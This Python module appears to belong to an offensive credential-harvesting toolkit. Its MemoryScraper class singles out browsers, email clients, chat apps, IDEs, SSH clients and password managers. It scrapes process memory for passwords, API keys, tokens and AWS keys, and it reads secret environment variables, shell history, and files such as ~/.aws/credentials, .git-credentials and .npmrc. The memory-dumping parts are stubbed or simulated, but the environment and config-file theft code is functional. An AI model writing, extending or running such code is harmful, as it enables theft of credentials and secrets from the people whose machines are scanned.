"""
Memory Scraper - Extract Credentials from Process Memory
Scans memory for passwords, keys, and sensitive data
"""

import asyncio
import logging
from typing import List, Dict, Any, Optional
import re
from pathlib import Path
from .credential_manager import Credential, CredentialHarvester

logger = logging.getLogger(__name__)


class MemoryScraper(CredentialHarvester):
    """
    Scan process memory for credentials and sensitive data
    """
    
    def __init__(self):
        super().__init__("Memory Scraper")
        
        # Credential patterns
        self.patterns = {
            'password': [
                rb'password[=:]\s*["\']?([^"\'\s]+)',
                rb'pwd[=:]\s*["\']?([^"\'\s]+)',
                rb'pass[=:]\s*["\']?([^"\'\s]+)',
            ],
            'api_key': [
                rb'api[_-]?key[=:]\s*["\']?([a-zA-Z0-9_\-]+)',
                rb'apikey[=:]\s*["\']?([a-zA-Z0-9_\-]+)',
            ],
            'token': [
                rb'token[=:]\s*["\']?([a-zA-Z0-9_\-\.]+)',
                rb'bearer\s+([a-zA-Z0-9_\-\.]+)',
            ],
            'aws_key': [
                rb'AKIA[0-9A-Z]{16}',
            ],
            'private_key': [
                rb'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
            ],
            'connection_string': [
                rb'Server=([^;]+);Database=([^;]+);(?:User Id|UID)=([^;]+);(?:Password|PWD)=([^;]+)',
                rb'mongodb://([^:]+):([^@]+)@',
                rb'postgres://([^:]+):([^@]+)@',
            ],
        }
        
        logger.info("MemoryScraper initialized")
        
    async def harvest(self) -> List[Credential]:
        """Harvest credentials from memory"""
        logger.info("Harvesting credentials from memory...")
        
        credentials = []
        
        # Scan various processes
        processes = await self.get_target_processes()
        
        for process in processes:
            creds = await self.scan_process(process)
            credentials.extend(creds)
            
        logger.info(f"Harvested {len(credentials)} credentials from memory")
        return credentials
        
    async def get_target_processes(self) -> List[Dict[str, Any]]:
        """
        Get target processes to scan
        
        Returns:
            List of process info
        """
        try:
            # High-value targets:
            targets = [
                'chrome', 'firefox', 'edge',  # Browsers
                'outlook', 'thunderbird',  # Email clients
                'slack', 'teams', 'discord',  # Chat apps
                'code', 'pycharm', 'intellij',  # IDEs
                'mysql', 'postgres', 'mongodb',  # Databases
                'putty', 'winscp', 'filezilla',  # SSH/FTP clients
                'keepass', 'lastpass',  # Password managers
            ]
            
            processes = []
            
            # Get running processes
            # Windows: tasklist
            # Linux: ps aux
            
            # Simulated processes
            processes = [
                {'pid': 1234, 'name': 'chrome.exe'},
                {'pid': 5678, 'name': 'outlook.exe'},
            ]
            
            return processes
            
        except Exception as e:
            logger.error(f"Get processes failed: {e}")
            return []
            
    async def scan_process(self, process: Dict[str, Any]) -> List[Credential]:
        """
        Scan process memory
        
        Args:
            process: Process information
            
        Returns:
            List of found credentials
        """
        try:
            logger.info(f"Scanning process {process['name']} (PID: {process['pid']})")
            
            credentials = []
            
            # Dump process memory
            memory_dump = await self.dump_process_memory(process['pid'])
            
            if not memory_dump:
                return []
                
            # Search for patterns
            for cred_type, patterns in self.patterns.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, memory_dump)
                    for match in matches:
                        cred = self.extract_credential(match, cred_type, process['name'])
                        if cred:
                            credentials.append(cred)
                            
            logger.info(f"Found {len(credentials)} credentials in {process['name']}")
            return credentials
            
        except Exception as e:
            logger.error(f"Process scan failed: {e}")
            return []
            
    async def dump_process_memory(self, pid: int) -> Optional[bytes]:
        """
        Dump process memory
        
        Args:
            pid: Process ID
            
        Returns:
            Memory dump
        """
        try:
            # Windows:
            """
            import ctypes
            from ctypes import wintypes
            
            PROCESS_VM_READ = 0x0010
            PROCESS_QUERY_INFORMATION = 0x0400
            
            h_process = ctypes.windll.kernel32.OpenProcess(
                PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                False,
                pid
            )
            
            # Read memory regions
            memory = b''
            # VirtualQueryEx to enumerate regions
            # ReadProcessMemory to read
            
            ctypes.windll.kernel32.CloseHandle(h_process)
            return memory
            """
            
            # Linux:
            """
            with open(f'/proc/{pid}/mem', 'rb') as f:
                # Read memory regions from /proc/{pid}/maps
                memory = f.read()
            return memory
            """
            
            # Simulated
            return b'password=secret123 api_key=abc123xyz'
            
        except Exception as e:
            logger.error(f"Memory dump failed: {e}")
            return None
            
    def extract_credential(self, match: re.Match, cred_type: str, source: str) -> Optional[Credential]:
        """
        Extract credential from regex match
        
        Args:
            match: Regex match
            cred_type: Credential type
            source: Source process
            
        Returns:
            Credential object
        """
        try:
            if cred_type == 'password':
                password = match.group(1).decode('utf-8', errors='ignore')
                return Credential(
                    username='',
                    password=password,
                    credential_type='plaintext',
                    source=f"Memory - {source}"
                )
                
            elif cred_type == 'api_key':
                api_key = match.group(1).decode('utf-8', errors='ignore')
                return Credential(
                    username='api_key',
                    password=api_key,
                    credential_type='api_key',
                    source=f"Memory - {source}"
                )
                
            elif cred_type == 'token':
                token = match.group(1).decode('utf-8', errors='ignore')
                return Credential(
                    username='token',
                    password=token,
                    credential_type='token',
                    source=f"Memory - {source}"
                )
                
            elif cred_type == 'aws_key':
                aws_key = match.group(0).decode('utf-8', errors='ignore')
                return Credential(
                    username='AWS_ACCESS_KEY',
                    password=aws_key,
                    credential_type='aws_key',
                    source=f"Memory - {source}"
                )
                
            elif cred_type == 'connection_string':
                # Extract server, database, user, password
                groups = match.groups()
                if len(groups) >= 4:
                    server = groups[0].decode('utf-8', errors='ignore')
                    database = groups[1].decode('utf-8', errors='ignore')
                    user = groups[2].decode('utf-8', errors='ignore')
                    password = groups[3].decode('utf-8', errors='ignore')
                    
                    return Credential(
                        username=user,
                        password=password,
                        domain=f"{server}/{database}",
                        credential_type='database',
                        source=f"Memory - {source}"
                    )
                    
            return None
            
        except Exception as e:
            logger.error(f"Credential extraction failed: {e}")
            return None
            
    async def scan_heap(self, pid: int) -> List[str]:
        """
        Scan process heap
        
        Args:
            pid: Process ID
            
        Returns:
            List of interesting strings
        """
        try:
            # Walk heap allocations
            # Look for credential-like strings
            
            strings = []
            
            return strings
            
        except Exception as e:
            logger.error(f"Heap scan failed: {e}")
            return []
            
    async def scan_environment_variables(self) -> List[Credential]:
        """
        Scan environment variables for credentials
        
        Returns:
            List of credentials
        """
        try:
            logger.info("Scanning environment variables...")
            
            import os
            credentials = []
            
            # Common environment variable names
            sensitive_vars = [
                'PASSWORD', 'PWD', 'PASS',
                'API_KEY', 'APIKEY', 'API_SECRET',
                'TOKEN', 'AUTH_TOKEN', 'ACCESS_TOKEN',
                'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
                'DATABASE_URL', 'DB_PASSWORD',
                'GITHUB_TOKEN', 'GITLAB_TOKEN',
            ]
            
            for var in sensitive_vars:
                value = os.environ.get(var)
                if value:
                    cred = Credential(
                        username=var,
                        password=value,
                        credential_type='environment',
                        source='Environment Variables'
                    )
                    credentials.append(cred)
                    
            logger.info(f"Found {len(credentials)} credentials in environment")
            return credentials
            
        except Exception as e:
            logger.error(f"Environment scan failed: {e}")
            return []
            
    async def scan_command_history(self) -> List[Credential]:
        """
        Scan command history for credentials
        
        Returns:
            List of credentials
        """
        try:
            logger.info("Scanning command history...")
            
            credentials = []
            
            # Bash history
            bash_history = Path.home() / '.bash_history'
            if bash_history.exists():
                with open(bash_history, 'r') as f:
                    history = f.read()
                    
                # Search for password patterns in commands
                # mysql -u user -pPassword123
                # psql postgresql://user:pass@localhost/db
                # curl -H "Authorization: Bearer token"
                
            # PowerShell history
            ps_history = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'PowerShell' / 'PSReadLine' / 'ConsoleHost_history.txt'
            if ps_history.exists():
                with open(ps_history, 'r') as f:
                    history = f.read()
                    
            logger.info(f"Found {len(credentials)} credentials in history")
            return credentials
            
        except Exception as e:
            logger.error(f"History scan failed: {e}")
            return []
            
    async def scan_config_files(self) -> List[Credential]:
        """
        Scan configuration files for credentials
        
        Returns:
            List of credentials
        """
        try:
            logger.info("Scanning configuration files...")
            
            credentials = []
            
            # Common config file locations
            config_paths = [
                Path.home() / '.aws' / 'credentials',
                Path.home() / '.ssh' / 'config',
                Path.home() / '.netrc',
                Path.home() / '.git-credentials',
                Path.home() / '.docker' / 'config.json',
                Path.home() / '.npmrc',
                Path.home() / '.pypirc',
            ]
            
            for config_file in config_paths:
                if config_file.exists():
                    creds = await self.parse_config_file(config_file)
                    credentials.extend(creds)
                    
            logger.info(f"Found {len(credentials)} credentials in config files")
            return credentials
            
        except Exception as e:
            logger.error(f"Config scan failed: {e}")
            return []
            
    async def parse_config_file(self, config_file: Path) -> List[Credential]:
        """Parse configuration file for credentials"""
        try:
            credentials = []
            
            with open(config_file, 'r') as f:
                content = f.read()
                
            # Apply patterns to file content
            for cred_type, patterns in self.patterns.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, content.encode())
                    for match in matches:
                        cred = self.extract_credential(match, cred_type, str(config_file))
                        if cred:
                            credentials.append(cred)
                            
            return credentials
            
        except Exception as e:
            logger.error(f"Config parse failed: {e}")
            return []
